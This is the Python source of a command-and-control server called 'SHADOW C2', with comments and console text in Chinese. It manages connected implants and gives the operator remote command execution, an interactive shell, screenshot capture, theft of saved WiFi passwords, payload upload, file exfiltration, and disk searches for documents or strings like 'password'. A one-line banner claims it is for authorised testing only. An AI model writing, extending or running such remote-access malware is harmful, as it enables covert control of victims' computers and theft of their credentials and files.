import sys
import os
import argparse

# 添加项目根目录到Python路径
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# 然后再导入其他模块
import socket
import threading
import json
import base64
from datetime import datetime
import random
import string
import time
from common.crypto import CryptoHandler

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.crypto = CryptoHandler()
        self.jitter_range = (0, 1)
        self.client_counter = 0
        self.interactive_shell = None
        print(f"[*] 初始化服务器完成")
    
    def generate_client_id(self, address):
        """生成短格式的客户端ID"""
        self.client_counter += 1
        return f"client_{self.client_counter}"
    
    def start(self):
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"[*] 服务器启动在 {self.host}:{self.port}")
            print("[*] 等待客户端连接...")
            
            while True:
                client, address = self.server.accept()
                client_id = self.generate_client_id(address)
                self.clients[client_id] = {
                    'connection': client,
                    'address': address,
                    'connect_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                print(f"[+] 新客户端连接: {address[0]} (ID: {client_id})")
                
                client_handler = threading.Thread(target=self.handle_client, args=(client_id,))
                client_handler.daemon = True
                client_handler.start()
        except Exception as e:
            print(f"[!] 服务器启动错误: {str(e)}")
    
    def generate_noise(self, min_len=10, max_len=100):
        """生成随机噪声数据"""
        length = random.randint(min_len, max_len)
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def obfuscate_data(self, data):
        """混淆数据"""
        noise = self.generate_noise()
        obfuscated = {
            "id": self.generate_noise(5, 10),
            "data": data,
            "noise": noise,
            "timestamp": datetime.now().timestamp()
        }
        return obfuscated
    
    def handle_client(self, client_id):
        client = self.clients[client_id]['connection']
        file_data = []
        file_info = None
        
        while True:
            try:
                data = client.recv(1024 * 1024)
                if not data:
                    break
                
                try:
                    decrypted_data = self.crypto.decrypt(data.decode())
                    response = json.loads(decrypted_data)
                    
                    # 处理文件传输
                    if response.get('type') == 'file_init':
                        file_info = response
                        file_data = []
                        print(f"\n[*] 开始接收文件: {response['filename']}")
                        print(f"文件大小: {response['total_size']} 字节")
                        print(f"修改时间: {response['modified']}")
                        continue
                        
                    elif response.get('type') == 'file_chunk':
                        chunk_data = base64.b64decode(response['data'])
                        file_data.append(chunk_data)
                        print(f"\r[*] 接收数据块: {response['chunk_number'] + 1}", end='')
                        continue
                        
                    elif response.get('type') == 'file_end':
                        if file_info:
                            print(f"\n[+] 文件接收完成，正在保存...")
                            
                            # 创建downloads目录
                            os.makedirs('downloads', exist_ok=True)
                            
                            # 保存文件
                            filename = os.path.join('downloads', file_info['filename'])
                            with open(filename, 'wb') as f:
                                for chunk in file_data:
                                    f.write(chunk)
                            
                            print(f"[+] 文件已保存: {filename}")
                            file_data = []
                            file_info = None
                            continue
                    
                    # 处理系统信息
                    if response.get('status') == 'success' and isinstance(response.get('data'), dict):
                        sysinfo = response['data']
                        if 'system' in sysinfo:  # 确认是系统信息响应
                            print("\n[+] 系统信息:")
                            print("=" * 60)
                            
                            # 基本系统信息
                            print("基本信息:")
                            print(f"操作系统: {sysinfo['system']['os']} {sysinfo['system']['version']}")
                            print(f"主机名: {sysinfo['system']['hostname']}")
                            print(f"用户名: {sysinfo['system']['username']}")
                            print(f"权限: {'管理员' if sysinfo['system']['is_admin'] else '普通用户'}")
                            print(f"启动时间: {sysinfo['system'].get('boot_time', 'Unknown')}")
                            print("-" * 60)
                            
                            # CPU信息
                            if 'cpu' in sysinfo:
                                print("CPU信息:")
                                cpu = sysinfo['cpu']
                                print(f"物理核心数: {cpu.get('physical_cores', 'Unknown')}")
                                print(f"逻辑核心数: {cpu.get('total_cores', 'Unknown')}")
                                print(f"最大频率: {cpu.get('max_frequency', 'Unknown')}")
                                print(f"当前频率: {cpu.get('current_frequency', 'Unknown')}")
                                print(f"CPU使用率: {cpu.get('cpu_usage', 'Unknown')}")
                                print("-" * 60)
                            
                            # 内存信息
                            if 'memory' in sysinfo:
                                print("内存信息:")
                                mem = sysinfo['memory']
                                print(f"总内存: {mem.get('total', 'Unknown')}")
                                print(f"可用: {mem.get('available', 'Unknown')}")
                                print(f"已用: {mem.get('used', 'Unknown')} ({mem.get('percent_used', 'Unknown')})")
                                print(f"交换分区总量: {mem.get('swap_total', 'Unknown')}")
                                print(f"交换分区使用: {mem.get('swap_used', 'Unknown')} ({mem.get('swap_percent', 'Unknown')})")
                                print("-" * 60)
                            
                            # 磁盘信息
                            if 'disks' in sysinfo:
                                print("磁盘信息:")
                                for disk in sysinfo['disks']:
                                    print(f"设备 {disk.get('device', 'Unknown')}:")
                                    print(f"  挂载点: {disk.get('mountpoint', 'Unknown')}")
                                    print(f"  文件系统: {disk.get('filesystem', 'Unknown')}")
                                    print(f"  总容量: {disk.get('total', 'Unknown')}")
                                    print(f"  已用: {disk.get('used', 'Unknown')} ({disk.get('percent_used', 'Unknown')})")
                                    print(f"  可用: {disk.get('free', 'Unknown')}")
                                print("-" * 60)
                            
                            # 网络信息
                            if 'network' in sysinfo:
                                print("网络适配器:")
                                for adapter in sysinfo['network']:
                                    print(f"接口: {adapter.get('interface', 'Unknown')}")
                                    print(f"  IP地址: {adapter.get('ip', 'Unknown')}")
                                    print(f"  子网掩码: {adapter.get('netmask', 'Unknown')}")
                                    print(f"  广播地址: {adapter.get('broadcast', 'Unknown')}")
                                print("-" * 60)
                            
                            # 进程信息
                            if 'processes' in sysinfo:
                                print("主要进程 (前10个):")
                                print(f"{'PID':<8} {'用户':<15} {'内存使用':<10} {'进程名'}")
                                print("-" * 60)
                                for proc in sysinfo['processes']:
                                    print(f"{proc.get('pid', 'N/A'):<8} "
                                          f"{proc.get('username', 'N/A'):<15} "
                                          f"{proc.get('memory_percent', 'N/A'):<10} "
                                          f"{proc.get('name', 'N/A')}")
                                print("-" * 60)
                            
                            if 'error' in sysinfo:
                                print(f"\n[!] 错误: {sysinfo['error']}")
                            
                            continue
                    
                    # 处理初始化信息
                    if response.get('type') == 'init':
                        self.clients[client_id].update({
                            'info': response['data'],
                            'connect_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        })
                        print(f"[+] 收到客户端 {client_id} 的系统信息")
                        continue
                    
                    # 处理截图数据
                    if response.get('type') == 'screenshot':
                        print(f"\n[*] 接收截图数据，大小: {response['size']} 字节")
                        screenshot_data = base64.b64decode(response['data'])
                        
                        # 保存截图
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        filename = f"screenshot_{client_id}_{timestamp}.jpg"
                        
                        with open(filename, 'wb') as f:
                            f.write(screenshot_data)
                        print(f"[+] 截图已保存: {filename}")
                        continue
                    
                    # 处理WiFi密码信息
                    if response.get('status') == 'success' and isinstance(response.get('data'), list):
                        wifi_data = response['data']
                        if all(isinstance(x, dict) and 'ssid' in x for x in wifi_data):
                            print("\n[+] WiFi密码信息:")
                            print("-" * 80)
                            print(f"{'SSID':<32} {'密码':<20} {'认证方式':<15} {'加密方式':<15}")
                            print("-" * 80)
                            for wifi in wifi_data:
                                print(f"{wifi['ssid']:<32} {wifi['password']:<20} "
                                      f"{wifi.get('auth_type', 'N/A'):<15} "
                                      f"{wifi.get('encryption', 'N/A'):<15}")
                            print("-" * 80)
                            continue
                    
                    # 处理普通命令响应
                    if response.get('status') == 'success':
                        if 'output' in response:
                            output = response['output'].strip()
                            if output:
                                print("-" * 60)
                                try:
                                    print(output)
                                except UnicodeEncodeError:
                                    print(output.encode(sys.stdout.encoding, 
                                                      errors='replace').decode(
                                                          sys.stdout.encoding))
                                print("-" * 60)
                            else:
                                print("(无输出)")
                    else:
                        print(f"\n[-] 命令执行失败: {response.get('message', '未知错误')}")
                    
                    # 处理文件下载响应
                    if response.get('type') == 'file':
                        print(f"\n[*] 接收文件: {response['filename']}")
                        print(f"大小: {response['size']} 字节")
                        print(f"修改时间: {response['modified']}")
                        
                        # 保存文件
                        file_data = base64.b64decode(response['data'])
                        filename = f"downloads/{response['filename']}"
                        
                        # 创建downloads目录（如果不存在）
                        os.makedirs('downloads', exist_ok=True)
                        
                        with open(filename, 'wb') as f:
                            f.write(file_data)
                        print(f"[+] 文件已保存: {filename}")
                        continue
                    
                    # 处理搜索结果
                    if response.get('status') == 'success' and 'data' in response and isinstance(response['data'], list):
                        # 检查是否是搜索结果（通过检查第一个结果的结构）
                        if response['data'] and all(key in response['data'][0] for key in ['name', 'path', 'size', 'modified']):
                            print(f"\n[+] {response.get('message', '搜索完成')}")
                            print("-" * 100)
                            print(f"{'文件名':<30} {'大小':<10} {'修改时间':<20} {'路径'}")
                            print("-" * 100)
                            
                            for file in response['data']:
                                size_str = self.format_size(file['size'])
                                print(f"{file['name']:<30} {size_str:<10} {file['modified']:<20} {file['path']}")
                            
                            print("-" * 100)
                            continue
                    
                except Exception as e:
                    print(f"[!] 解析响应数据时出错: {str(e)}")
                    continue
                
            except Exception as e:
                print(f"[!] 处理客户端 {client_id} 时出错: {str(e)}")
                break
        
        # 清理断开的客户
        del self.clients[client_id]
        client.close()
        print(f"[-] 客户端 {client_id} 断开连接")
    
    def send_command(self, client_id, command, args=None):
        if client_id not in self.clients:
            print(f"[!] 客户端 {client_id} 不存在")
            return
            
        message = {
            "command": command,
            "args": args or {}
        }
        
        try:
            print(f"[*] 发送命令到客户端 {client_id}: {message}")
            # 直接加密数据，不使用混淆
            encrypted_data = self.crypto.encrypt(json.dumps(message))
            self.clients[client_id]['connection'].send(encrypted_data.encode())
            print("[*] 命令已发送，等待响应...")
        except Exception as e:
            print(f"[!] 发送命令到客户端 {client_id} 时出错: {str(e)}")
    
    def list_clients(self):
        print("\n当前连接的客户端:")
        print("-" * 80)
        print(f"{'ID':<10} {'IP地址':<15} {'主机名':<15} {'用名':<15} {'权限':<8} {'上线间':<20}")
        print("-" * 80)
        
        for client_id, client_data in self.clients.items():
            address = client_data['address']
            info = client_data.get('info', {})
            connect_time = client_data.get('connect_time', 'Unknown')
            
            hostname = info.get('hostname', 'Unknown')
            username = info.get('username', 'Unknown')
            is_admin = '管理员' if info.get('is_admin') else '普通用户'
            
            print(f"{client_id:<10} {address[0]:<15} {hostname:<15} {username:<15} "
                  f"{is_admin:<8} {connect_time:<20}")
        print("-" * 80)
        
        # 显示详细信息
        for client_id, client_data in self.clients.items():
            info = client_data.get('info', {})
            if info:
                print(f"\n{client_id} 的详细信息:")
                print(f"  操作系统: {info.get('os', 'Unknown')} {info.get('os_version', '')}")
                print(f"  进程信息: PID={info.get('process_id', 'Unknown')}, "
                      f"Path={info.get('process_name', 'Unknown')}")
    
    def interactive_shell_session(self, client_id):
        """处理交互式shell会话"""
        print(f"\n[*] 进入交互式shell模式 (client_{client_id})")
        print("[*] 使用 'exit' 退出shell模式\n")
        
        while True:
            try:
                shell_cmd = input("shell> ")
                if shell_cmd.lower() == 'exit':
                    break
                    
                if shell_cmd.strip():
                    self.send_command(client_id, "shell", {"command": shell_cmd})
                    # 等待响应完成
                    time.sleep(0.5)
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Shell错误: {str(e)}")
                break
        
        print("\n[*] 退出shell模式")
        self.interactive_shell = None
    
    def upload_file(self, client_id, local_file):
        """上传文件到客户端"""
        try:
            if not os.path.exists(local_file):
                print(f"[!] 文件不存在: {local_file}")
                return
            
            chunk_size = 512 * 1024  # 512KB chunks
            total_size = os.path.getsize(local_file)
            chunk_count = (total_size + chunk_size - 1) // chunk_size
            
            print(f"[*] 开始上传文件 {local_file} ({total_size} 字节)")
            
            with open(local_file, 'rb') as f:
                for i in range(chunk_count):
                    chunk = f.read(chunk_size)
                    args = {
                        "filename": os.path.basename(local_file),
                        "chunk_number": i,
                        "total_chunks": chunk_count,
                        "data": base64.b64encode(chunk).decode()
                    }
                    
                    self.send_command(client_id, "upload", args)
                    print(f"\r[*] 上传进度: {i+1}/{chunk_count}", end='')
                    time.sleep(0.1)  # 添加延迟防止数据混淆
            
            print("\n[+] 文件上传完成")
            
        except Exception as e:
            print(f"[!] 文件上传错误: {str(e)}")
    
    def download_file(self, client_id, remote_file):
        """从客户端下载文件"""
        try:
            self.send_command(client_id, "download", {"filename": remote_file})
            print(f"[*] 正在请求下载文件 {remote_file}...")
            
        except Exception as e:
            print(f"[!] 文件下载错误: {str(e)}")
    
    def format_size(self, size):
        """格式化文件大小显示"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"

def supports_color():
    """检查终端是否支持颜色输出"""
    import platform
    if platform.system() == 'Windows':
        try:
            # Windows 10 build 14931 及更高版本支持ANSI
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # 启用 ANSI 支持
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except:
            return False
    else:
        # Linux/Mac 一般都支持
        return True

def color_text(text, color_code):
    """根据终端支持情况返回彩色文本"""
    if supports_color():
        return f"\033[{color_code}m{text}\033[0m"
    return text

def print_banner():
    """打印启动横幅和帮助信息"""
    # 定义颜色代码
    CYAN = "1;36"
    GREEN = "1;32"
    YELLOW = "1;33"
    WHITE = "1;37"
    RED = "1;31"
    
    banner = """
    ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
    ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
    ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
    ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
    [Advanced Command & Control Framework v1.0]
    """
    print(color_text(banner, CYAN))
    
    print(color_text("=" * 80, GREEN))
    print(color_text("[*] SHADOW C2 Framework - Power Through Stealth", YELLOW))
    print(color_text("=" * 80, GREEN))
    
    help_text = f"""
{color_text("[操作指令]", CYAN)}
    {color_text("基础命令:", WHITE)}
    ├── list                            - 显示所有连接的客户端
    ├── cmd <client_id> <command>       - 在指定客户端执行单条命令
    └── shell <client_id>               - 进入交互式shell模式

    {color_text("信息收集:", WHITE)}
    ├── sysinfo <client_id>             - 获取详细的系统信息
    ├── screenshot <client_id>          - 获取指定客户端的屏幕截图
    └── wifi <client_id>                - 获取保存的WiFi密码

    {color_text("文件操作:", WHITE)}
    ├── upload <client_id> <local_file> - 上传文件到客户端
    ├── download <client_id> <remote_file> - 从客户端下载文件
    └── search <client_id> [选项]       - 高级文件搜索

    {color_text("系统控制:", WHITE)}
    ├── help                           - 显示此帮助信息
    └── exit                           - 退出服务器

{color_text("[使用示例]", CYAN)}
    {color_text("1. 客户端管理:", WHITE)}
       > list                          # 列出所有连接的客户端
       > cmd client_1 whoami           # 执行系统命令
       > shell client_1                # 进入交互式Shell

    {color_text("2. 信息收集:", WHITE)}
       > sysinfo client_1             # 收集系统信息
       > screenshot client_1          # 捕获屏幕截图
       > wifi client_1               # 获取WiFi密码

    {color_text("3. 文件操作:", WHITE)}
       > upload client_1 payload.exe  # 上传文件
       > download client_1 data.zip   # 下载文件
       > search client_1 -p C:/Users -n *.doc  # 搜索文件

{color_text("[文件搜索选项]", CYAN)}
    {color_text("参数说明:", WHITE)}
    ├── -p, --path <path>      - 搜索起始路径
    ├── -n, --name <pattern>   - 文件名匹配模式
    ├── -d, --depth <num>      - 最大搜索深度
    ├── -s, --size <range>     - 文件大小范围 (例如: 1MB-10MB)
    ├── -e, --ext <exts>       - 文件扩展名列表 (例如: .txt,.doc)
    └── -c, --content <text>   - 搜索文件内容

{color_text("[高级搜索示例]", CYAN)}
    > search client_1 -p C:/Users -n *.doc -s 1MB-100MB
    > search client_1 -p D:/ -e .pdf,.txt -c "confidential"
    > search client_1 -p C:/Windows -d 2 -n "*.sys"
    """
    print(help_text)
    
    print(color_text("=" * 80, GREEN))
    print(color_text("[!] 警告: 仅供安全研究和授权测试使用", RED))
    print(color_text("=" * 80, GREEN))

def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description='C2 Server')
    parser.add_argument('-p', '--port', type=int, default=4444,
                      help='监听端口 (默认: 4444)')
    parser.add_argument('-H', '--host', type=str, default='0.0.0.0',
                      help='监听地址 (默认: 0.0.0.0)')
    return parser.parse_args()

def parse_size(size_str):
    """解析文件大小字符串（例如：1MB, 500KB）"""
    size_str = size_str.upper()
    multipliers = {
        'B': 1,
        'KB': 1024,
        'MB': 1024 * 1024,
        'GB': 1024 * 1024 * 1024
    }
    
    for unit, multiplier in multipliers.items():
        if size_str.endswith(unit):
            try:
                return int(float(size_str[:-len(unit)]) * multiplier)
            except ValueError:
                raise ValueError(f"无效的大小格式: {size_str}")
    
    try:
        return int(size_str)  # 假设是纯数字（字节）
    except ValueError:
        raise ValueError(f"无效的大小格式: {size_str}")

if __name__ == "__main__":
    args = parse_args()
    print_banner()
    
    # 使用命令行参数创建服务器
    server = C2Server(host=args.host, port=args.port)
    
    # 启动服务器线程
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    print(f"[*] 服务器监听在 {args.host}:{args.port}")
    
    # 命令行界面
    while True:
        try:
            if server.interactive_shell:
                continue  # 如果在交互式shell模式，跳过主循环
                
            cmd = input("C2> ").strip().split()
            if not cmd:
                continue
                
            if cmd[0] == "shell" and len(cmd) == 2:
                client_id = cmd[1]
                if client_id in server.clients:
                    server.interactive_shell = client_id
                    server.interactive_shell_session(client_id)
                else:
                    print(f"[!] 客户端 {client_id} 不存在")
            
            elif cmd[0] == "list":
                server.list_clients()
            
            elif cmd[0] == "cmd" and len(cmd) >= 3:
                client_id = cmd[1]
                command = " ".join(cmd[2:])
                server.send_command(client_id, "shell", {"command": command})
            
            elif cmd[0] == "screenshot" and len(cmd) == 2:
                server.send_command(cmd[1], "screenshot")
            
            elif cmd[0] == "wifi" and len(cmd) == 2:
                server.send_command(cmd[1], "wifi")
            
            elif cmd[0] == "sysinfo" and len(cmd) == 2:
                server.send_command(cmd[1], "sysinfo")
            
            elif cmd[0] == "upload" and len(cmd) == 3:
                server.upload_file(cmd[1], cmd[2])
            
            elif cmd[0] == "download" and len(cmd) == 3:
                server.download_file(cmd[1], cmd[2])
            
            elif cmd[0] == "help":
                print_banner()
            
            elif cmd[0] == "exit":
                break
                
            elif cmd[0] == "search":
                if len(cmd) < 3:
                    print("用法: search <client_id> [选项]")
                    print("选项:")
                    print("  -p, --path <path>      搜索路径")
                    print("  -n, --name <pattern>   文件名模式（支持通配符）")
                    print("  -d, --depth <num>      最大搜索深度")
                    print("  -s, --size <range>     文件大小范围 (例如: 1MB-10MB)")
                    print("  -e, --ext <extensions> 文件扩展名 (例如: .txt,.doc)")
                    print("  -c, --content <text>   搜索文件内容")
                    print("\n示例:")
                    print("  search client_1 -p C:/Users -n *.doc")
                    print("  search client_1 -p /home -e .txt,.log -c password")
                    continue
                
                client_id = cmd[1]
                search_args = {}
                
                try:
                    i = 2
                    while i < len(cmd):
                        if cmd[i] in ['-p', '--path']:
                            search_args['path'] = cmd[i + 1]
                            i += 2
                        elif cmd[i] in ['-n', '--name']:
                            search_args['pattern'] = cmd[i + 1]
                            i += 2
                        elif cmd[i] in ['-d', '--depth']:
                            search_args['max_depth'] = int(cmd[i + 1])
                            i += 2
                        elif cmd[i] in ['-s', '--size']:
                            size_range = cmd[i + 1].split('-')
                            if len(size_range) == 2:
                                search_args['min_size'] = parse_size(size_range[0])
                                search_args['max_size'] = parse_size(size_range[1])
                            i += 2
                        elif cmd[i] in ['-e', '--ext']:
                            search_args['extensions'] = cmd[i + 1].split(',')
                            i += 2
                        elif cmd[i] in ['-c', '--content']:
                            search_args['content'] = cmd[i + 1]
                            i += 2
                        else:
                            i += 1
                    
                    server.send_command(client_id, "search", search_args)
                    
                except Exception as e:
                    print(f"[!] 解析搜索参数时出错: {str(e)}")
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] 错误: {str(e)}")
    
    print("\n[*] 关闭服务器...") 